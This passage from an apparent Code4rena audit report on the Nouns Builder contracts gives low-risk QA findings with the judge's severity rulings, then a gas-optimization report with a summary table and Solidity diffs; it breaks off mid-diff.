([MetadataRenderer.sol#L259](https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/metadata/MetadataRenderer.sol#L259)).\n\n## [04]\n`MetadataRenderer.addProperties` seems to be very error-prone to me. When an item is added for a new property, `isNewProperty` needs to be set and you need to keep in mind that the property ID refers to the ID of the newly added property, not the global ID that the property will get.\n\n## [05]\nIn `Auction._handleOutgoingTransfer`, it is not checked if the WETH transfer succeeds (when WETH is used). The commonly used WETH implementation will revert on failure, but this is no requirement of EIP-20, so using another WETH implementation could lead to a problem there.\n\n## [06]\n`Treasury.isExpired` returns true for non-existing proposals, which could lead to wrong states for third-party applications that use this function. Consider reverting for non-existing proposals.\n\n## [07]\nIf the `Governor` contract would ever contain ETH (e.g, after a `selfdestruct` of some other contract), it could not be retrieved, as the `execute` function can only forward the received ETH, but not use its own.\n\n## [08]\nEven after a vetoer is burned, the owner can still update it. This can reduce the confidence in the system, as the owner always has complete veto control. Consider making the burning operation final.\n\n## [09]\n`Auction` can only be paused / unpaused after a vote with the corresponding delays. This can be too slow in certain scenarios (e.g., emergency response after a security incident). Consider introducing an optional emergency pause feature (e.g., by the founder).\n\n## [10]\nIt is still possible to bid when an Auction is paused. This can have negative consequences, for instance when the bidding process contains a security vulnerability and the system is temporarily paused for mitigation.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/104#issuecomment-1258845787):**\n > **In Token, when a founder has wallet set to address(0), he will not receive any tokens (which is good), but he is still included in all of the calculations such as numFounders or totalOwnership, meaning that they will be wrong in such situations.**<br>\n> Low\n> \n> **In Token, totalFounderOwnership()**<br>\n> Refactoring\n> \n> **In MetadataRenderer._getItemImage**<br>\n> Also don't get it, code compiles\n> \n> **MetadataRenderer.addProperties**<br>\n> Refactoring\n> \n> **Treasury.isExpired**<br>\n> Non-critical\n> \n> **If the Governor**<br>\n> Low\n> \n> **Even after a vetoer is burned**<br>\n> Disagree as it has to be voted back in\n> \n> **Auction can only be paused**<br>\n> Refactoring\n> \n> **It is still possible to bid when an Auction is paused**<br>\n> Disagree as it keeps it fair for people in the auction\n> \n> 2L 3R\n>\n> All in all a custom report + well done performance overall, fairly won, gratz!\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 75 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133) by **pfapostol** received the top score from the judge.\n\n*The following wardens also submitted reports: [Aymen0909](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/532), [volky](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/343), [0xA5DF](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/276), [Migue](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/236), [\\_Adam](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/429), [LeoS](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/243), [0xSmartContract](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/382), [c3phas](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/655), [SnowMan](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/71), [gogo](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/49), [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/447), [MiloTruck](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/363), [Saintcode\\_](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/102), [ReyAdmirado](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/125), [JAGADESH](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/336), [Rolezn](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/210), [oyc\\_109](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/56), [0x1f8b](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/223), [DimSon](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/289), [CertoraInc](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/302), [WatchDogs](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/466), [rfa](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/696), [TomJ](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/512), [CodingNameKiki](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/19), [RaymondFam](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/48), [JC](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/87), [Matin](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/164), [martin](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/199), [Waze](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/480), [leosathya](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/587), [Deivitto](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/683), [brgltd](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/718), [tofunmi](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/642), [Tomo](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/33), [R2](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/140), [Jeiwan](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/473), [ballx](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/14), [Bnke0x0](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/38), [Lambda](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/105), [gianganhnguyen](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/212), [bulej93](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/249), [ch0bu](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/260), [PPrieditis](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/328), [Respx](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/383), [simon135](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/396), [ret2basic](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/502), [wagmi](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/515), [asutorufos](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/585), [djxploit](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/619), [pauliax](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/709), [Tointer](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/118), [prasantgupta52](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/530), [lucacez](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/665), [StevenL](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/30), [dharma09](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/58), [robee](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/61), [durianSausage](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/63), [Cr4ckM3](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/120), [fatherOfBlocks](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/156), [sikorico](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/172), [Metatron](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/213), [0xkatana](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/216), [Chandr](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/217), [Samatak](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/257), [imare](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/316), [0x4non](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/331), [0xc0ffEE](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/353), [Franfran](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/415), [PaludoX0](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/437), [zishansami](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/446), [0x5rings](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/489), [easy\\_peasy](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/548), [peiw](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/648), and [ajtra](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/661).*\n\n## Summary\n\nGas savings are estimated using the gas report of existing `forge test --gas-report` tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need them.<br>\nIn this project, the optimizer is set on 500000 runs, so some of the common optimizations are useless or partially useless. Only cases that save gas with this configuration of optimizer are included in the report.\n\n|       | Issue                                                                                                                              | Instances | Estimated gas(deployments) | Estimated gas(method call) |\n| :---: | :--------------------------------------------------------------------------------------------------------------------------------- | :-------: | :------------------------: | :------------------------: |\n| **G&#8209;01** | `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` |     5     |           168 820          |            1 672           |\n| **G&#8209;02** | State variables can be packed into fewer storage slots                                                                             |     1     |           99 511           |              -             |\n| **G&#8209;03** | State variables should be cached in stack variables rather than re-reading them from storage                                       |     5     |           70 505           |            2 634           |\n| **G&#8209;04** | Using bools for storage incurs overhead                                                                                            |     5     |           60 668           |            1 191           |\n| **G&#8209;05** | Storage variable is used when local exists                                                                                         |     2     |            1 400           |            2 602           |\n| **G&#8209;06** | Use named returns where appropriate                                                                                                |     3     |            2 000           |             174            |\n| **-** | Overall Gas Saved                                                                                                                  |     21    |           341 027          |           10 231           |\n\n**Total: 21 instances over 6 issues**\n\n***\n\n## [G-01] `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (5 instances)\n\nDeployment Gas Saved: **168 820**<br>\nMethod Call Gas Saved: **1 672**<br>\n`forge snapshot --diff`: **8 746** Gas Saved\n\nIt may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.\nException: case when you need to read all or many members multiple times. In report included only cases that saved gas\n\n*   [src/auction/Auction.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol)\n\n```diff\ndiff --git a/src/auction/Auction.sol b/src/auction/Auction.sol\nindex 794da99..92854f6 100644\n--- a/src/auction/Auction.sol\n+++ b/src/auction/Auction.sol\n@@ -89,7 +89,7 @@ contract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionS\n    89,  89:     /// @param _tokenId The ERC-721 token id\n    90,  90:     function createBid(uint256 _tokenId) external payable nonReentrant {\n    91,  91:         // Get a copy of the current auction\n-  92     :-        Auction memory _auction = auction;\n+       92:+        Auction storage _auction = auction;\n    93,  93:\n    94,  94:         // Ensure the bid is for the current token\n    95,  95:         if (_auction.tokenId != _tokenId) revert INVALID_TOKEN_ID();\n```\n\n*   [src/governance/governor/Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol)\n\n```diff\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex 0d963c5..ca5600a 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -355,7 +355,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n    355, 355:         if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();\n    356, 356:\n    357, 357:         // Get a copy of the proposal\n- 358     :-        Proposal memory proposal = proposals[_proposalId];\n+      358:+        Proposal storage proposal = proposals[_proposalId];\n    359, 359:\n    360, 360:         // Cannot realistically underflow and `getVotes` would revert\n    361, 361:         unchecked {\n\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex ca5600a..67db726 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -505,7 +505,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n    505, 505:             uint256\n    506, 506:         )\n    507, 507:     {\n- 508     :-        Proposal memory proposal = proposals[_proposalId];\n+      508:+        Proposal storage proposal = proposals[_proposalId];\n    509, 509:\n    510, 510:         return (proposal.againstVotes, proposal.forVotes, proposal.abstainVotes);\n    511, 511:     }\n```\n\n*   [src/lib/token/ERC721Votes.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol)\n\n```diff\ndiff --git a/src/lib/token/ERC721Votes.sol b/src/lib/token/ERC721Votes.sol\nindex 3e64720..c5759cd 100644\n--- a/src/lib/token/ERC721Votes.sol\n+++ b/src/lib/token/ERC721Votes.sol\n@@ -87,7 +87,7 @@ abstract contract ERC721Votes is IERC721Votes, EIP712, ERC721 {\n    87,  87:             uint256 middle;\n    88,  88:\n    89,  89:             // Used to temporarily hold a checkpoint\n-  90     :-            Checkpoint memory cp;\n+       90:+            Checkpoint storage cp;\n    91,  91:\n    92,  92:             // While a valid checkpoint is to be found:\n    93,  93:             while (high > low) {\n```\n\n*   [src/token/metadata/MetadataRenderer.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol)\n\n```diff\ndiff --git a/src/token/metadata/MetadataRenderer.sol b/src/token/metadata/MetadataRenderer.sol\nindex 7a140ec..070da5f 100644\n--- a/src/token/metadata/MetadataRenderer.sol\n+++ b/src/token/metadata/MetadataRenderer.sol\n@@ -231,7 +231,7 @@ contract MetadataRenderer is IPropertyIPFSMetadataRenderer, UUPS, Ownable, Metad\n    231, 231:                 bool isLast = i == lastProperty;\n    232, 232:\n    233, 233:                 // Get a copy of the property\n- 234     :-                Property memory property = properties[i];\n+      234:+                Property storage property = properties[i];\n    235, 235:\n    236, 236:                 // Get the token's generated attribute\n    237, 237:                 uint256 attribute = tokenAttributes[i + 1];\n```\n\n**Controversial (Not included in estimation):**\n\nSaved in deploy: 25433, but lost 100-300 gas per user\n\n*   [src/governance/governor/Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol)\n\n```diff\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex ca5600a..b47413f 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -412,7 +412,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n    412, 412:     /// @param _proposalId The proposal id\n    413, 413:     function state(bytes32 _proposalId) public view returns (ProposalState) {\n    414, 414:         // Get a copy of the proposal\n- 415     :-        Proposal memory proposal = proposals[_proposalId];\n+      415:+        Proposal storage proposal = proposals[_proposalId];\n    416, 416:\n    417, 417:         // Ensure the proposal exists\n    418, 418:         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();\n```\n\n## [G-02] State variables can be packed into fewer storage slots (1 instances)\n\nDeployment Gas Saved: **99 511**<br>\n`forge snapshot --diff`: **1 080** Gas Saved\n\n*   [src/auction/Auction.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol)\n\nStorage:\n\n```solidity\n    /*external inheritance:*/\naddress internal _owner;       // 20\naddress internal _pendingOwner // 20\nuint256 internal _status;      // 32\nuint8 internal _initialized;   // 1\nbool internal _initializing;   // 1\nbool internal _paused;         // 1\n    /* self storage */\nSettings internal settings;\n/*\naddress treasury;              // 20\nuint40 duration;               // 5\nuint40 timeBuffer;             // 5\nuint8 minBidIncrement;         // 1\nuint256 reservePrice;          // 32\n*/\nToken public token;            // 20\nAuction public auction;\n/*\nuint256 tokenId;               // 32\nuint256 highestBid;            // 32\naddress highestBidder;         // 20\nuint40 startTime;              // 5\nuint40 endTime;                // 5\nbool settled;                  // 1\n*/\n```\n\nFix:\n\n```diff\ndiff --git a/src/auction/types/AuctionTypesV1.sol b/src/auction/types/AuctionTypesV1.sol\nindex ae90c6c..8fb4241 100644\n--- a/src/auction/types/AuctionTypesV1.sol\n+++ b/src/auction/types/AuctionTypesV1.sol\n@@ -12,10 +12,10 @@ contract AuctionTypesV1 {\n    12,  12:     /// @param minBidIncrement The minimum percentage an incoming bid must raise the highest bid\n    13,  13:     /// @param reservePrice The reserve price of each auction\n    14,  14:     struct Settings {\n-  15     :-        address treasury;\n+       15:+        uint8 minBidIncrement;\n    16,  16:         uint40 duration;\n    17,  17:         uint40 timeBuffer;\n-  18     :-        uint8 minBidIncrement;\n+       18:+        address treasury;\n    19,  19:         uint256 reservePrice;\n    20,  20:     }\n    21,  21:\n@@ -27,11 +27,11 @@ contract AuctionTypesV1 {\n    27,  27:     /// @param endTime The timestamp the auction ends\n    28,  28:     /// @param settled If the auction has been settled\n    29,  29:     struct Auction {\n-  30     :-        uint256 tokenId;\n-  31     :-        uint256 highestBid;\n-  32     :-        address highestBidder;\n    33,  30:         uint40 startTime;\n    34,  31:         uint40 endTime;\n    35,  32:         bool settled;\n+       33:+        address highestBidder;\n+       34:+        uint256 tokenId;\n+       35:+        uint256 highestBid;\n    36,  36:     }\n    37,  37: }\ndiff --git a/test/Auction.t.sol b/test/Auction.t.sol\nindex b664078..bf2c2e5 100644\n--- a/test/Auction.t.sol\n+++ b/test/Auction.t.sol\n@@ -44,7 +44,7 @@ contract AuctionTest is NounsBuilderTest {\n    44,  44:         assertEq(token.ownerOf(1), founder2);\n    45,  45:         assertEq(token.ownerOf(2), address(auction));\n    46,  46:\n-  47     :-        (uint256 tokenId, uint256 highestBid, address highestBidder, uint256 startTime, uint256 endTime, bool settled) = auction.auction();\n+       47:+        (uint256 startTime, uint256 endTime, bool settled, address highestBidder, uint256 tokenId, uint256 highestBid) = auction.auction();\n    48,  48:\n    49,  49:         assertEq(tokenId, 2);\n    50,  50:         assertEq(highestBid, 0);\n@@ -71,7 +71,7 @@ contract AuctionTest is NounsBuilderTest {\n    71,  71:         vm.prank(bidder1);\n    72,  72:         auction.createBid{ value: _amount }(2);\n    73,  73:\n-  74     :-        (, uint256 highestBid, address highestBidder, , , ) = auction.auction();\n+       74:+        (, , , address highestBidder, , uint256 highestBid) = auction.auction();\n    75,  75:\n    76,  76:         assertEq(highestBid, _amount);\n    77,  77:         assertEq(highestBidder, bidder1);\n@@ -123,7 +123,7 @@ contract AuctionTest is NounsBuilderTest {\n123, 123:         assertEq(bidder2BeforeBalance - bidder2AfterBalance, 0.5 ether);\n124, 124:         assertEq(address(auction).balance, 0.5 ether);\n125, 125:\n- 126     :-        (, uint256 highestBid, address highestBidder, , , ) = auction.auction();\n+      126:+       (, , , address highestBidder, , uint256 highestBid) = auction.auction();\n127, 127:\n128, 128:         assertEq(highestBid, 0.5 ether);\n129, 129:         assertEq(highestBidder, bidder2);\n@@ -155,7 +155,7 @@ contract AuctionTest is NounsBuilderTest {\n155, 155:         vm.prank(bidder2);\n156, 156:         auction.createBid{ value: 1 ether }(2);\n157, 157:\n- 158     :-        (, , , , uint256 endTime, ) = auction.auction();\n+      158:+        (, uint256 endTime, , ,, ) = auction.auction();\n159, 159:\n160, 160:         assertEq(endTime, 14 minutes);\n161, 161:     }\n@@ -237,7 +237,7 @@ contract AuctionTest is NounsBuilderTest {\n237, 237:\n238, 238:         auction.settleAuction();\n239, 239:\n- 240     :-        (, , , , , bool settled) = auction.auction();\n+      240:+        (, , bool settled, , , ) = auction.auction();\n241, 241:\n242, 242:         assertEq(settled, true);\n243, 243:     }\ndiff --git a/test/utils/NounsBuilderTest.sol b/test/utils/NounsBuilderTest.sol\nindex cb17d6b..ccabc62 100644\n--- a/test/utils/NounsBuilderTest.sol\n+++ b/test/utils/NounsBuilderTest.sol\n@@ -240,7 +240,7 @@ contract NounsBuilderTest is Test {\n240, 240:\n241, 241:         unchecked {\n242, 242:             for (uint256 i; i < _numTokens; ++i) {\n- 243     :-                (uint256 tokenId, , , , , ) = auction.auction();\n+      243:+                (, , , , uint256 tokenId, ) = auction.auction();\n244, 244:\n245, 245:                 vm.prank(otherUsers[i]);\n246, 246:                 auction.createBid{ value: reservePrice }(tokenId);\n```\n\n## [G-03] State variables should be cached in stack variables rather than re-reading them from storage (5 instances)\n\nDeployment Gas Saved: **70 505**<br>\nMethod Call Gas Saved: **2 634**<br>\n`forge snapshot --diff`: **12 481** Gas Saved\n\nCaching of a state variable replaces each Gwarmaccess (100 gas) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs or having local caches of state variable contracts/addresses.\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\n*   [src/auction/Auction.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol)\n\nfunction: `_settleAuction`: `auction` cached in 169 but readed from storage in 172\nfunction: `_handleOutgoingTransfer`: `IWETH(WETH)` can be cached\n\n```diff\ndiff --git a/src/auction/Auction.sol b/src/auction/Auction.sol\nindex 794da99..3ef53f5 100644\n--- a/src/auction/Auction.sol\n+++ b/src/auction/Auction.sol\n@@ -356,11 +356,13 @@ contract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionS\n356, 356:\n357, 357:         // If the transfer failed:\n358, 358:         if (!success) {\n+      359:+            IWETH iweth = IWETH(WETH);\n+      360:+\n359, 361:             // Wrap as WETH\n- 360     :-            IWETH(WETH).deposit{ value: _amount }();\n+      362:+            iweth.deposit{ value: _amount }();\n361, 363:\n362, 364:             // Transfer WETH instead\n- 363     :-            IWETH(WETH).transfer(_to, _amount);\n+      365:+            iweth.transfer(_to, _amount);\n364, 366:         }\n365, 367:     }\n366, 368:\n```\n\n*   [src/governance/governor/Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol)\n\nfunction proposalVotes: There is no need to copy `proposals[_proposalId]` to memory, because you reading every field exactly one time\n\n```diff\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex 0d963c5..c8fb215 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -505,9 +505,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n505, 505:             uint256\n506, 506:         )\n507, 507:     {\n- 508     :-        Proposal memory proposal = proposals[_proposalId];\n- 509     :-\n- 510     :-        return (proposal.againstVotes, proposal.forVotes, proposal.abstainVotes);\n+      508:+        return (proposals[_proposalId].againstVotes, proposals[_proposalId].forVotes, proposals[_proposalId].abstainVotes);\n511, 509:     }\n512, 510:\n513, 511:     /// @notice The timestamp valid to execute a proposal\n```\n\n*   [src/governance/treasury/Treasury.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/treasury/Treasury.sol)\n\nfunction `isReady`: `timestamps[_proposalId]` can be cached\n\n```diff\ndiff --git a/src/governance/treasury/Treasury.sol b/src/governance/treasury/Treasury.sol\nindex b78bc8c..ce94e3b 100644\n--- a/src/governance/treasury/Treasury.sol\n+++ b/src/governance/treasury/Treasury.sol\n@@ -86,7 +86,8 @@ contract Treasury is ITreasury, UUPS, Ownable, TreasuryStorageV1 {\n86,  86:     /// @notice If a proposal is ready to execute (does not consider expiration)\n87,  87:     /// @param _proposalId The proposal id\n88,  88:     function isReady(bytes32 _proposalId) public view returns (bool) {\n-  89     :-        return timestamps[_proposalId] != 0 && block.timestamp >= timestamps[_proposalId];\n+       89:+        uint256 timestamp = timestamps[_proposalId];\n+       90:+        return timestamp != 0 && block.timestamp >= timestamp;\n90,  91:     }\n91,  92:\n92,  93:     ///                                                          ///\n```\n\n*   [src/token/Token.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol)\n\nfunction `_isForFounder`: use storage pointer to founder\n\n```diff\ndiff --git a/src/token/Token.sol b/src/token/Token.sol\nindex afad142..ef92fe6 100644\n--- a/src/token/Token.sol\n+++ b/src/token/Token.sol\n@@ -178,14 +178,16 @@ contract Token is IToken, UUPS, ReentrancyGuard, ERC721Votes, TokenStorageV1 {\n178, 178:         // Get the base token id\n179, 179:         uint256 baseTokenId = _tokenId % 100;\n180, 180:\n+      181:+        Founder storage _founder = tokenRecipient[baseTokenId];\n+      182:+\n181, 183:         // If there is no scheduled recipient:\n- 182     :-        if (tokenRecipient[baseTokenId].wallet == address(0)) {\n+      184:+        if (_founder.wallet == address(0)) {\n183, 185:             return false;\n184, 186:\n185, 187:             // Else if the founder is still vesting:\n- 186     :-        } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) {\n+      188:+        } else if (block.timestamp < _founder.vestExpiry) {\n187, 189:             // Mint the token to the founder\n- 188     :-            _mint(tokenRecipient[baseTokenId].wallet, _tokenId);\n+      190:+            _mint(_founder.wallet, _tokenId);\n189, 191:\n190, 192:             return true;\n191, 193:\n```\n\n*   [src/token/metadata/MetadataRenderer.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol)\n\nfunction `_getItemImage`: complex expression can be cached as storage pointer\n\n```diff\ndiff --git a/src/token/metadata/MetadataRenderer.sol b/src/token/metadata/MetadataRenderer.sol\nindex 7a140ec..6640988 100644\n--- a/src/token/metadata/MetadataRenderer.sol\n+++ b/src/token/metadata/MetadataRenderer.sol\n@@ -253,10 +253,11 @@ contract MetadataRenderer is IPropertyIPFSMetadataRenderer, UUPS, Ownable, Metad\n253, 253:\n254, 254:     /// @dev Encodes the reference URI of an item\n255, 255:     function _getItemImage(Item memory _item, string memory _propertyName) private view returns (string memory) {\n+      256:+        IPFSGroup storage _ipfsData = ipfsData[_item.referenceSlot];\n256, 257:         return\n257, 258:             UriEncode.uriEncode(\n258, 259:                 string(\n- 259     :-                    abi.encodePacked(ipfsData[_item.referenceSlot].baseUri, _propertyName, \"/\", _item.name, ipfsData[_item.referenceSlot].extension)\n+      260:+                    abi.encodePacked(_ipfsData.baseUri, _propertyName, \"/\", _item.name, _ipfsData.extension)\n260, 261:                 )\n261, 262:             );\n262, 263:     }\n```\n\n## [G-04] Using bools for storage incurs overhead (5 instances)\n\nDeployment Gas Saved: **60 668**<br>\nAvg. Method Call Gas Saved: **1 191**<br>\n`forge snapshot --diff`: **9 748** Gas Saved\n\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past\n\nNOTE: in some cases, usually in structs, this optimization can cause significant user gas loss, these cases are intentionally excluded from the report\n\n*   [src/governance/governor/Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol)\n\n```diff\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex 0d963c5..62506ae 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -255,13 +255,13 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n    255, 255:         if (state(_proposalId) != ProposalState.Active) revert VOTING_NOT_STARTED();\n    256, 256:\n    257, 257:         // Ensure the voter hasn't already voted\n- 258     :-        if (hasVoted[_proposalId][_voter]) revert ALREADY_VOTED();\n+      258:+        if (1==hasVoted[_proposalId][_voter]) revert ALREADY_VOTED();\n    259, 259:\n    260, 260:         // Ensure the vote is valid\n    261, 261:         if (_support > 2) revert INVALID_VOTE();\n    262, 262:\n    263, 263:         // Record the voter as having voted\n- 264     :-        hasVoted[_proposalId][_voter] = true;\n+      264:+        hasVoted[_proposalId][_voter] = 1;\n    265, 265:\n    266, 266:         // Get the pointer to the proposal\n    267, 267:         Proposal storage proposal = proposals[_proposalId];\n```\n\n*   [src/governance/governor/storage/GovernorStorageV1.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/storage/GovernorStorageV1.sol)\n\n```diff\ndiff --git a/src/governance/governor/storage/GovernorStorageV1.sol b/src/governance/governor/storage/GovernorStorageV1.sol\nindex beff22e..25d7ff2 100644\n--- a/src/governance/governor/storage/GovernorStorageV1.sol\n+++ b/src/governance/governor/storage/GovernorStorageV1.sol\n@@ -16,5 +16,5 @@ contract GovernorStorageV1 is GovernorTypesV1 {\n    16,  16:\n    17,  17:     /// @notice If a user has voted on a proposal\n    18,  18:     /// @dev Proposal Id => User => Has Voted\n-  19     :-    mapping(bytes32 => mapping(address => bool)) internal hasVoted;\n+       19:+    mapping(bytes32 => mapping(address => uint256)) internal hasVoted;\n    20,  20: }\n```\n\n*   [src/lib/token/ERC721.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721.sol)\n\n```diff\ndiff --git a/src/lib/token/ERC721.sol b/src/lib/token/ERC721.sol\nindex 36a4bed..5808613 100644\n--- a/src/lib/token/ERC721.sol\n+++ b/src/lib/token/ERC721.sol\n@@ -35,7 +35,7 @@ abstract contract ERC721 is IERC721, Initializable {\n    35,  35:\n    36,  36:     /// @notice The balance approvals\n    37,  37:     /// @dev Owner => Operator => Approved\n-  38     :-    mapping(address => mapping(address => bool)) internal operatorApprovals;\n+       38:+    mapping(address => mapping(address => uint256)) internal operatorApprovals;\n    39,  39:\n    40,  40:     ///                                                          ///\n    41,  41:     ///                           FUNCTIONS                      ///\n@@ -75,7 +75,7 @@ abstract contract ERC721 is IERC721, Initializable {\n    75,  75:     /// @param _owner The owner address\n    76,  76:     /// @param _operator The operator address\n    77,  77:     function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\n- 